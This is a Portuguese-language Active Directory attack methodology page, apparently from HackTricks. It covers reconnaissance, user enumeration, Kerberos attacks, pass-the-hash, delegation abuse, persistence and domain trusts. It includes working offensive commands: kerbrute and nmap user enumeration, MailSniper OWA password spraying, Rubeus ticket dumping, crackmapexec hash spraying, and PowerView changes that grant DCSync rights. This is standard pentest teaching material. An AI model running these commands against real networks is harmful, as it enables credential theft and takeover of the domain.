# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem de forma eficiente **domínios**, **usuários** e **objetos** dentro de uma rede. É projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla os **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** abrange uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Árvores** são grupos desses domínios ligados por uma estrutura compartilhada, e uma **floresta** representa a coleção de várias árvores, interconectadas por **relações de confiança**, formando a camada mais alta da estrutura organizacional. Direitos específicos de **acesso** e **comunicação** podem ser designados em cada um desses níveis.

Os conceitos-chave dentro do **Active Directory** incluem:

1. **Diretório** – Abriga todas as informações relacionadas aos objetos do Active Directory.
2. **Objeto** – Denota entidades dentro do diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domínio** – Serve como um contêiner para objetos de diretório, com a capacidade de múltiplos domínios coexistirem dentro de uma **floresta**, cada um mantendo sua própria coleção de objetos.
4. **Árvore** – Um agrupamento de domínios que compartilham um domínio raiz comum.
5. **Floresta** – O auge da estrutura organizacional no Active Directory, composta por várias árvores com **relações de confiança** entre elas.

**Serviços de Domínio do Active Directory (AD DS)** abrangem uma gama de serviços críticos para a gestão centralizada e comunicação dentro de uma rede. Esses serviços incluem:

1. **Serviços de Domínio** – Centraliza o armazenamento de dados e gerencia interações entre **usuários** e **domínios**, incluindo funcionalidades de **autenticação** e **busca**.
2. **Serviços de Certificado** – Supervisiona a criação, distribuição e gestão de **certificados digitais** seguros.
3. **Serviços de Diretório Leve** – Suporta aplicações habilitadas para diretório através do **protocolo LDAP**.
4. **Serviços de Federação de Diretório** – Fornece capacidades de **single-sign-on** para autenticar usuários em várias aplicações web em uma única sessão.
5. **Gestão de Direitos** – Ajuda a proteger material com direitos autorais regulando sua distribuição e uso não autorizados.
6. **Serviço DNS** – Crucial para a resolução de **nomes de domínio**.

Para uma explicação mais detalhada, consulte: [**TechTerms - Definição de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticação Kerberos**

Para aprender como **atacar um AD**, você precisa **entender** muito bem o **processo de autenticação Kerberos**.\
[**Leia esta página se você ainda não souber como funciona.**](kerberos-authentication.md)

## Folha de Dicas

Você pode acessar [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida dos comandos que você pode executar para enumerar/explorar um AD.

## Reconhecimento do Active Directory (Sem credenciais/sessões)

Se você apenas tiver acesso a um ambiente AD, mas não tiver credenciais/sessões, você poderia:

- **Pentestar a rede:**
- Escanear a rede, encontrar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md)).
- Enumerar DNS pode fornecer informações sobre servidores chave no domínio, como web, impressoras, compartilhamentos, vpn, mídia, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dê uma olhada na [**Metodologia de Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informações sobre como fazer isso.
- **Verificar acesso nulo e de convidado em serviços smb** (isso não funcionará em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:

{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar a rede**
- Coletar credenciais [**impersonando serviços com Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar host [**abusando do ataque de retransmissão**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **expondo** [**serviços UPnP falsos com evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair nomes de usuários/nome de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes de domínio e também de fontes publicamente disponíveis.
- Se você encontrar os nomes completos dos trabalhadores da empresa, pode tentar diferentes **convenções de nome de usuário AD** (**[leia isso](https://activedirectorypro.com/active-directory-user-naming-convention/)**). As convenções mais comuns são: _NomeSobrenome_, _Nome.Sobrenome_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSobrenome_, _N.Sobrenome_, _SobrenomeNome_, _Sobrenome.Nome_, _SobrenomeN_, _Sobrenome.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Enumeração SMB/LDAP anônima:** Verifique as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeração Kerbrute**: Quando um **nome de usuário inválido é solicitado**, o servidor responderá usando o código de erro **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo-nos determinar que o nome de usuário era inválido. **Nomes de usuários válidos** resultarão em uma resposta **TGT em um AS-REP** ou no erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário deve realizar a pré-autenticação.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```
- **Servidor OWA (Outlook Web Access)**

Se você encontrar um desses servidores na rede, você também pode realizar **enumeração de usuários contra ele**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de nomes de usuários neste [**repositório do github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) \*\*\*\* e neste ([**nomes de usuários estatisticamente prováveis**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter o **nome das pessoas que trabalham na empresa** da etapa de reconhecimento que você deve ter realizado antes disso. Com o nome e sobrenome, você pode usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar nomes de usuários válidos potenciais.

### Conhecendo um ou vários nomes de usuários

Ok, então você sabe que já tem um nome de usuário válido, mas sem senhas... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tiver** o atributo _DONT_REQ_PREAUTH_, você pode **solicitar uma mensagem AS_REP** para esse usuário que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as senhas **mais comuns** com cada um dos usuários descobertos, talvez algum usuário esteja usando uma senha fraca (lembre-se da política de senhas!).
- Note que você também pode **spray servidores OWA** para tentar obter acesso aos servidores de e-mail dos usuários.

{{#ref}}
password-spraying.md
{{#endref}}

### Envenenamento LLMNR/NBT-NS

Você pode ser capaz de **obter** alguns **hashes** de desafio para quebrar **envenenando** alguns protocolos da **rede**:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTML Relay

Se você conseguiu enumerar o Active Directory, terá **mais e-mails e uma melhor compreensão da rede**. Você pode ser capaz de forçar ataques de NTML [**relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) \*\*\*\* para obter acesso ao ambiente AD.

### Roubar Credenciais NTLM

Se você pode **acessar outros PCs ou compartilhamentos** com o **usuário nulo ou convidado**, você pode **colocar arquivos** (como um arquivo SCF) que, se acessados de alguma forma, **dispararão uma autenticação NTML contra você**, permitindo que você **roube** o **desafio NTLM** para quebrá-lo:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Enumerando Active Directory COM credenciais/sessão

Para esta fase, você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tiver algumas credenciais válidas ou um shell como um usuário de domínio, **você deve lembrar que as opções dadas anteriormente ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada, você deve saber qual é o **problema do duplo salto do Kerberos.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeração

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você poderá iniciar a **Enumeração do Active Directory:**

Em relação ao [**ASREPRoast**](asreproast.md), você agora pode encontrar todos os usuários vulneráveis possíveis, e em relação ao [**Password Spraying**](password-spraying.md), você pode obter uma **lista de todos os nomes de usuários** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você pode usar o [**CMD para realizar um reconhecimento básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell para reconhecimento**](../basic-powershell-for-pentesters/index.html), que será mais discreto
- Você também pode [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para reconhecimento em um Active Directory é [**BloodHound**](bloodhound.md). Não é **muito discreto** (dependendo dos métodos de coleta que você usa), mas **se você não se importar** com isso, deve definitivamente experimentar. Descubra onde os usuários podem RDP, encontre caminhos para outros grupos, etc.
- **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS do AD**](ad-dns-records.md), pois podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é **AdExplorer.exe** do **SysInternal** Suite.
- Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credenciais nos campos _userPassword_ & _unixUserPassword_, ou até mesmo por _Description_. cf. [Senha no comentário do usuário AD em PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se você estiver usando **Linux**, também pode enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

É muito fácil obter todos os nomes de usuários do domínio do Windows (`net user /domain`, `Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeração pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente o do cmd, powershell, powerview e BloodHound), aprenda como enumerar um domínio e pratique até se sentir confortável. Durante uma avaliação, este será o momento chave para encontrar seu caminho para DA ou decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **tickets TGS** usados por serviços vinculados a contas de usuário e quebrar sua criptografia—que é baseada em senhas de usuário—**offline**.

Mais sobre isso em:

{{#ref}}
kerberoast.md
{{#endref}}

### Conexão remota (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você tenha obtido algumas credenciais, pode verificar se tem acesso a alguma **máquina**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com suas varreduras de portas.

### Escalação de Privilégios Local

Se você comprometeu credenciais ou uma sessão como um usuário regular de domínio e tem **acesso** com esse usuário a **qualquer máquina no domínio**, você deve tentar encontrar uma maneira de **escalar privilégios localmente e procurar credenciais**. Isso porque apenas com privilégios de administrador local você poderá **extrair hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**escalação de privilégios local no Windows**](../windows-local-privilege-escalation/index.html) e uma [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de Sessão Atuais

É muito **improvável** que você encontre **tickets** no usuário atual **dando permissão para acessar** recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTML Relay

Se você conseguiu enumerar o Active Directory, terá **mais e-mails e uma melhor compreensão da rede**. Você pode ser capaz de forçar ataques de NTML [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### **Procure Credenciais em Compartilhamentos de Computador**

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** arquivos **interessantes sendo compartilhados dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito chata e repetitiva (e mais ainda se você encontrar centenas de documentos que precisa verificar).

[**Siga este link para aprender sobre ferramentas que você poderia usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Roubar Credenciais NTLM

Se você pode **acessar outros PCs ou compartilhamentos**, poderia **colocar arquivos** (como um arquivo SCF) que, se acessados de alguma forma, **dispararão uma autenticação NTML contra você**, permitindo que você **roube** o **desafio NTLM** para quebrá-lo:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitiu que qualquer usuário autenticado **comprometesse o controlador de domínio**.

{{#ref}}
printnightmare.md
{{#endref}}

## Escalação de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir, um usuário de domínio regular não é suficiente, você precisa de alguns privilégios/credenciais especiais para realizar esses ataques.**

### Extração de Hash

Esperançosamente, você conseguiu **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilégios localmente](../windows-local-privilege-escalation/index.html).\
Então, é hora de despejar todos os hashes na memória e localmente.\
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Uma vez que você tenha o hash de um usuário**, pode usá-lo para **impersoná-lo**.\
Você precisa usar alguma **ferramenta** que **realize** a **autenticação NTLM usando** esse **hash**, **ou** você poderia criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que, quando qualquer **autenticação NTLM for realizada**, esse **hash será usado.** A última opção é o que o mimikatz faz.\
[**Leia esta página para mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Esse ataque visa **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como uma alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desativado** e apenas **Kerberos é permitido** como protocolo de autenticação.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de suas senhas ou valores de hash. Este ticket roubado é então usado para **impersonar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilização de Credenciais

Se você tem o **hash** ou a **senha** de um **administrador local**, deve tentar **fazer login localmente** em outros **PCs** com isso.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note que isso é bastante **barulhento** e **LAPS** **mitigaria** isso.

### Abuso de MSSQL & Links Confiáveis

Se um usuário tiver privilégios para **acessar instâncias MSSQL**, ele poderá usá-las para **executar comandos** no host MSSQL (se estiver rodando como SA), **roubar** o **hash** NetNTLM ou até mesmo realizar um **ataque** de **relay**.\
Além disso, se uma instância MSSQL for confiável (link de banco de dados) por uma instância MSSQL diferente. Se o usuário tiver privilégios sobre o banco de dados confiável, ele poderá **usar o relacionamento de confiança para executar consultas também na outra instância**. Essas confianças podem ser encadeadas e, em algum momento, o usuário pode ser capaz de encontrar um banco de dados mal configurado onde pode executar comandos.\
**Os links entre bancos de dados funcionam até mesmo através de confianças de floresta.**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Delegação Não Restrita

Se você encontrar qualquer objeto de Computador com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e você tiver privilégios de domínio no computador, você poderá despejar TGTs da memória de todos os usuários que fazem login no computador.\
Portanto, se um **Administrador de Domínio fizer login no computador**, você poderá despejar seu TGT e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças à delegação restrita, você poderia até mesmo **comprometer automaticamente um Servidor de Impressão** (esperançosamente será um DC).

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Delegação Restrita

Se um usuário ou computador for permitido para "Delegação Restrita", ele poderá **se passar por qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, você poderá **se passar por qualquer usuário** (até mesmo administradores de domínio) para acessar alguns serviços.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Delegação Baseada em Recursos

Ter privilégio de **WRITE** em um objeto do Active Directory de um computador remoto permite a obtenção de execução de código com **privilégios elevados**:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre alguns objetos de domínio** que podem permitir que você **mova** lateralmente/**escalone** privilégios.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço de Spooler de Impressão

Descobrir um **serviço de Spool** escutando dentro do domínio pode ser **abusado** para **adquirir novas credenciais** e **escalar privilégios**.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, é possível **coletar credenciais da memória** e até mesmo **injetar beacons em seus processos** para se passar por eles.\
Normalmente, os usuários acessarão o sistema via RDP, então aqui está como realizar alguns ataques sobre sessões RDP de terceiros:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornece um sistema para gerenciar a **senha do Administrador local** em computadores unidos ao domínio, garantindo que seja **randomizada**, única e frequentemente **alterada**. Essas senhas são armazenadas no Active Directory e o acesso é controlado através de ACLs apenas para usuários autorizados. Com permissões suficientes para acessar essas senhas, a movimentação para outros computadores se torna possível.

{{#ref}}
laps.md
{{#endref}}

### Roubo de Certificados

**Coletar certificados** da máquina comprometida pode ser uma maneira de escalar privilégios dentro do ambiente:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Modelos de Certificados

Se **modelos vulneráveis** estiverem configurados, é possível abusar deles para escalar privilégios:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Pós-exploração com conta de alto privilégio

### Despejando Credenciais de Domínio

Uma vez que você obtenha privilégios de **Administrador de Domínio** ou até mesmo melhores **Administradores de Empresa**, você pode **despejar** o **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como Persistência

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis ao [**Kerberoast**](kerberoast.md)

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis ao [**ASREPRoast**](asreproast.md)

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **ataque Silver Ticket** cria um **ticket legítimo do Ticket Granting Service (TGS)** para um serviço específico usando o **hash NTLM** (por exemplo, o **hash da conta do PC**). Este método é empregado para **acessar os privilégios do serviço**.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **ataque Golden Ticket** envolve um atacante obtendo acesso ao **hash NTLM da conta krbtgt** em um ambiente Active Directory (AD). Esta conta é especial porque é usada para assinar todos os **Tickets Granting Tickets (TGTs)**, que são essenciais para autenticação dentro da rede AD.

Uma vez que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (ataque Silver ticket).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Estes são como golden tickets forjados de uma maneira que **bypassa mecanismos comuns de detecção de golden tickets.**

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistência de Conta de Certificados**

**Ter certificados de uma conta ou ser capaz de solicitá-los** é uma maneira muito boa de poder persistir na conta dos usuários (mesmo que ele mude a senha):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistência de Domínio de Certificados**

**Usar certificados também é possível para persistir com altos privilégios dentro do domínio:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

O objeto **AdminSDHolder** no Active Directory garante a segurança de **grupos privilegiados** (como Administradores de Domínio e Administradores de Empresa) aplicando uma **Lista de Controle de Acesso (ACL)** padrão em todos esses grupos para prevenir alterações não autorizadas. No entanto, esse recurso pode ser explorado; se um atacante modificar a ACL do AdminSDHolder para dar acesso total a um usuário comum, esse usuário ganha controle extenso sobre todos os grupos privilegiados. Essa medida de segurança, destinada a proteger, pode, portanto, falhar, permitindo acesso indevido, a menos que monitorada de perto.

[**Mais informações sobre o Grupo AdminDSHolder aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciais DSRM

Dentro de cada **Controlador de Domínio (DC)**, existe uma conta de **administrador local**. Ao obter direitos de administrador em tal máquina, o hash do Administrador local pode ser extraído usando **mimikatz**. Após isso, uma modificação no registro é necessária para **habilitar o uso dessa senha**, permitindo acesso remoto à conta do Administrador local.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistência de ACL

Você poderia **dar** algumas **permissões especiais** a um **usuário** sobre alguns objetos de domínio específicos que permitirão que o usuário **escalone privilégios no futuro**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descritores de Segurança

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** um **objeto**. Se você puder apenas **fazer** uma **pequena mudança** no **descritor de segurança** de um objeto, você pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Alterar **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas de domínio.

{{#ref}}
skeleton-key.md
{{#endref}}

### SSP Personalizado

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra um **novo Controlador de Domínio** no AD e o usa para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar nenhum **log** sobre as **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
Note que se você usar dados errados, logs bem feios aparecerão.

{{#ref}}
dcshadow.md
{{#endref}}

### Persistência LAPS

Anteriormente discutimos como escalar privilégios se você tiver **permissões suficientes para ler senhas LAPS**. No entanto, essas senhas também podem ser usadas para **manter persistência**.\
Verifique:

{{#ref}}
laps.md
{{#endref}}

## Escalonamento de Privilégios de Floresta - Confianças de Domínio

A Microsoft vê a **Floresta** como o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar a floresta inteira a ser comprometida**.

### Informações Básicas

Uma [**confiança de domínio**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Ele essencialmente cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam sem problemas. Quando os domínios configuram uma confiança, eles trocam e retêm **chaves** específicas dentro de seus **Controladores de Domínio (DCs)**, que são cruciais para a integridade da confiança.

Em um cenário típico, se um usuário pretende acessar um serviço em um **domínio confiável**, ele deve primeiro solicitar um ticket especial conhecido como um **TGT inter-realm** do DC de seu próprio domínio. Este TGT é criptografado com uma **chave** compartilhada que ambos os domínios concordaram. O usuário então apresenta este TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Após a validação bem-sucedida do TGT inter-realm pelo DC do domínio confiável, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Passos**:

1. Um **computador cliente** no **Domínio 1** inicia o processo usando seu **hash NTLM** para solicitar um **Ticket Granting Ticket (TGT)** de seu **Controlador de Domínio (DC1)**.
2. O DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **TGT inter-realm** do DC1, que é necessário para acessar recursos no **Domínio 2**.
4. O TGT inter-realm é criptografado com uma **chave de confiança** compartilhada entre DC1 e DC2 como parte da confiança de domínio bidirecional.
5. O cliente leva o TGT inter-realm para o **Controlador de Domínio (DC2)** do Domínio 2.
6. O DC2 verifica o TGT inter-realm usando sua chave de confiança compartilhada e, se válido, emite um **Ticket Granting Service (TGS)** para o servidor no Domínio 2 que o cliente deseja acessar.
7. Finalmente, o cliente apresenta este TGS ao servidor, que é criptografado com o hash da conta do servidor, para obter acesso ao serviço no Domínio 2.

### Diferentes confianças

É importante notar que **uma confiança pode ser unidirecional ou bidirecional**. Na opção bidirecional, ambos os domínios confiarão um no outro, mas na relação de confiança **unidirecional**, um dos domínios será o **confiável** e o outro o **confiador**. No último caso, **você só poderá acessar recursos dentro do domínio confiador a partir do confiável**.

Se o Domínio A confiar no Domínio B, A é o domínio confiador e B é o confiável. Além disso, no **Domínio A**, isso seria uma **confiança de saída**; e no **Domínio B**, isso seria uma **confiança de entrada**.

**Diferentes relações de confiança**

- **Confianças Pai-Filho**: Esta é uma configuração comum dentro da mesma floresta, onde um domínio filho automaticamente tem uma confiança transitiva bidirecional com seu domínio pai. Essencialmente, isso significa que as solicitações de autenticação podem fluir sem problemas entre o pai e o filho.
- **Confianças de Cruzamento**: Referidas como "confianças de atalho", estas são estabelecidas entre domínios filhos para acelerar processos de referência. Em florestas complexas, as referências de autenticação normalmente precisam viajar até a raiz da floresta e depois descer até o domínio alvo. Ao criar cruzamentos, a jornada é encurtada, o que é especialmente benéfico em ambientes geograficamente dispersos.
- **Confianças Externas**: Estas são configuradas entre diferentes domínios não relacionados e são não transitivas por natureza. De acordo com [a documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), as confianças externas são úteis para acessar recursos em um domínio fora da floresta atual que não está conectado por uma confiança de floresta. A segurança é reforçada através da filtragem de SID com confianças externas.
- **Confianças de Raiz de Árvore**: Essas confianças são automaticamente estabelecidas entre o domínio raiz da floresta e uma nova raiz de árvore adicionada. Embora não sejam comumente encontradas, as confianças de raiz de árvore são importantes para adicionar novas árvores de domínio a uma floresta, permitindo que mantenham um nome de domínio exclusivo e garantindo transitividade bidirecional. Mais informações podem ser encontradas no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
